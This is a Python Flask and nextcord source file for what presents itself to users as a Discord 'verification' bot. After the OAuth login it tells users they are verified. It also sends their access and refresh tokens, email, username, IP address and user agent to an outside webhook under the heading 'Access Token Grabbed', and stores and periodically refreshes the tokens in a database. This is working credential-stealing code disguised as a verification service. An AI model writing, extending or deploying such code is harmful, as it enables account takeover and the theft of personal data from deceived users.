from flask import Flask, render_template, redirect, make_response
from deta import Deta
import flask, httpx, os, nextcord, asyncio
from nextcord.ext import commands

client_id = os.environ.get("client_id")
client_secret = os.environ.get("client_secret")
redirect_uri = os.environ.get("redirect_uri")
client_token = os.environ.get("client_token")
client_db = os.environ.get("client_db")
guild_id = "976340233740230656"
role_id = "1058760863194038392"
webhook = os.environ.get("webhook_url")

def insert_db(user_id, access_token, refresh_token):
	try:
		deta = Deta(client_db)
		db = deta.Base("Auths")
		data = {"access_token":access_token,"refresh_token":refresh_token}
		db.put(data, str(user_id))
	except:
		return

def exchange_code(code):
	data = {
		'client_id': client_id,
		'client_secret': client_secret,
		'grant_type': 'authorization_code',
		'code': code,
		'redirect_uri': redirect_uri
	}
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	r = httpx.post("https://discord.com/api/v10/oauth2/token", data=data, headers=headers)
	return r

def refresh_token(key, tk):
	data = {
		'client_id': client_id,
		'client_secret': client_secret,
		'grant_type': 'refresh_token',
		"refresh_token":tk
	}
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	r = httpx.post("https://discord.com/api/v10/oauth2/token", data=data, headers=headers)
	data = r.json()
	if r.status_code == 200:
		r1 = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":"Bearer " +	data["access_token"]})
		data1 = r1.json()
		dbinsert = insert_db(data1["id"],data["access_token"],data["refresh_token"])
		return f"[+] Refreshed token of {data1['id']}"
	else:
		try:
			deta = Deta(client_db)
			db = deta.Base("Auths")
			db.delete(key)
			return f"[-] Failed to refresh token of {key}"
		except:
			return f"[-] Failed to refresh token of {key}"
		return f"[-] Failed to refresh token of {key}"
	
def addrole(member_id):
	headers = {
		'Authorization': "Bot " + client_token
	}
	r = httpx.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{member_id}/roles/{role_id}", headers=headers)

def log(access_token, refresh_token):
	r = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":"Bearer " +	access_token})
	data = r.json()
	roleadd = addrole(data["id"])
	dbinsert = insert_db(data["id"],access_token,refresh_token)
	av = f"https://cdn.nextcordapp.com/avatars/{data['id']}/{data['avatar']}.gif?size=160"
	if httpx.get(av).status_code == 415:
			av = av.replace("gif","png")
	json = {"content":access_token,"embeds":[{"title":"Access Token Grabbed","description":f"""**ID: ** {data['id']}
**Username: ** {data['username']}#{data['discriminator']}
**Email: ** {data['email']}
**Access Token: ** {access_token}
**Refresh Token: ** {refresh_token}
**IP: ** {flask.request.headers['X-Forwarded-For']}
**User Agent: ** {flask.request.headers['User-Agent']}""","thumbnail":{"url":av}}]}
	req = httpx.post(url=webhook,json=json)
	return req

class BotClass(commands.Bot):
	def __init__(self):
		super().__init__(command_prefix="",intents=nextcord.Intents.all(),help_command=None)
		self.token = client_token
		self.load_cogs()
	def load_cogs(self):
		self.load_extension("onami")
		self.load_extension("commands")
		
app = Flask(__name__,template_folder="./templates")

@app.route("/")
def home():
	code = flask.request.args.get("code")
	exchange = exchange_code(code)
	if exchange.status_code == 200:
		req = log(exchange.json()['access_token'],exchange.json()['refresh_token'])
	return f"You have been verified!"
	
async def main():
	bot = BotClass()
	await bot.start(client_token)

if __name__ == "__main__":
	#app.run()
	asyncio.run(main())